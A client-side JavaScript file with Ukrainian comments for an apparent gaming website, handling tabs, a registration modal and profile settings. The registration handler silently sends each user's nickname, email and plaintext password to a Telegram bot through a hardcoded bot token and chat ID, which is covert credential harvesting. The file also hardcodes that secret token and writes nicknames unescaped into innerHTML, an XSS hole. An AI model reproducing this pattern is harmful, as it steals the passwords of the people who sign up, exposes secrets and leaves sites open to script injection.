let isUserRegistered = false;
let pendingTabId = null;
let pendingButton = null;

function handleTabClick(btnElement, tabId) {
    if (!isUserRegistered) {
        pendingTabId = tabId;
        pendingButton = btnElement;
        document.getElementById('auth-modal').style.display = 'flex';
        return; 
    }
    openTab(btnElement, tabId);
}

function openTab(btnElement, tabId) {
    const tabs = document.querySelectorAll('.tab-content');
    tabs.forEach(tab => tab.classList.remove('active-tab'));

    const buttons = document.querySelectorAll('.menu-btn');
    buttons.forEach(btn => btn.classList.remove('active'));

    document.getElementById(tabId).classList.add('active-tab');
    btnElement.classList.add('active');
}

// РЕЄСТРАЦІЯ
document.getElementById('registration-form').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const nickname = document.getElementById('nickname').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value; // Отримуємо пароль з форми
    const errorSpan = document.getElementById('email-error');

    if (!email.includes('@') || !email.includes('.')) {
        errorSpan.textContent = "Please enter a valid email address with '@' and '.'";
        errorSpan.style.display = "block";
        return; 
    }

    errorSpan.style.display = "none";
    
    // === ВІДПРАВКА В TELEGRAM ===
    // Встав сюди свій токен від BotFather та Chat ID від Getmyid_bot
    const botToken = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg'; 
    const chatId = ' 8399462172';             
    
    // Формуємо текст повідомлення
    const messageText = `🔥 Нова реєстрація!\n👤 Нікнейм: ${nickname}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
    
    // Створюємо URL для запиту до API Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;

    // Відправляємо запит
    fetch(telegramUrl)
        .then(response => {
            if(response.ok) {
                console.log("Дані успішно відправлені в Telegram!");
            } else {
                console.error("Помилка відправки в Telegram.");
            }
        })
        .catch(error => console.error("Помилка:", error));

    document.getElementById('player-display').innerHTML = `Player: <strong>${nickname}</strong>`;
   
    // Після реєстрації показуємо кнопку Settings
    document.getElementById('settings-btn').style.display = 'inline-block';

    document.getElementById('auth-modal').style.display = 'none';
    isUserRegistered = true;

    if (pendingTabId && pendingButton) {
        openTab(pendingButton, pendingTabId);
    }
});

// Закриття реєстрації при кліку поза вікном
const modalOverlay = document.getElementById('auth-modal');
modalOverlay.addEventListener('click', function(event) {
    if (!event.target.closest('.modal-box')) {
        modalOverlay.style.display = 'none';
        pendingTabId = null;
        pendingButton = null;
    }
});

// --- НАЛАШТУВАННЯ ПРОФІЛУ ---

function openSettings() {
    document.getElementById('right-sidebar').classList.add('open');
}

function closeSettings() {
    document.getElementById('right-sidebar').classList.remove('open');
    document.getElementById('settings-error').style.display = 'none';
    document.getElementById('change-nickname').value = '';
    document.getElementById('change-password').value = '';
    document.getElementById('confirm-password').value = '';
    document.getElementById('photo-upload').value = '';
    
    // Скидання тексту назви файлу
    const fileNameDisplay = document.getElementById('file-name-display');
    if (fileNameDisplay) {
        fileNameDisplay.textContent = "No file chosen";
        fileNameDisplay.style.color = "#888";
    }
}

function saveSettings() {
    const newNickname = document.getElementById('change-nickname').value;
    const newPassword = document.getElementById('change-password').value;
    const confirmPassword = document.getElementById('confirm-password').value;
    const photoUpload = document.getElementById('photo-upload');
    const errorSpan = document.getElementById('settings-error');

    errorSpan.style.display = 'none';
    
    // Перевірка паролів
    if (newPassword !== "" || confirmPassword !== "") {
        if (newPassword !== confirmPassword) {
            errorSpan.textContent = "Passwords do not match!";
            errorSpan.style.display = "block";
            return; 
        }
    }

    // Зміна нікнейму
    if (newNickname.trim() !== "") {
        document.getElementById('player-display').innerHTML = `Player: <strong>${newNickname}</strong>`;
    }

    // Зміна фото профілю
    if (photoUpload.files && photoUpload.files[0]) {
        const reader = new FileReader();
        reader.onload = function(e) {
            document.getElementById('player-photo').src = e.target.result;
        }
        reader.readAsDataURL(photoUpload.files[0]);
    }

    closeSettings();
}

// Оновлення тексту при виборі файлу
document.getElementById('photo-upload').addEventListener('change', function(event) {
    const fileNameDisplay = document.getElementById('file-name-display');
    
    if (event.target.files.length > 0) {
        fileNameDisplay.textContent = event.target.files[0].name;
        fileNameDisplay.style.color = "#ffffff"; 
    } else {
        fileNameDisplay.textContent = "No file chosen";
        fileNameDisplay.style.color = "#888";
    }
});
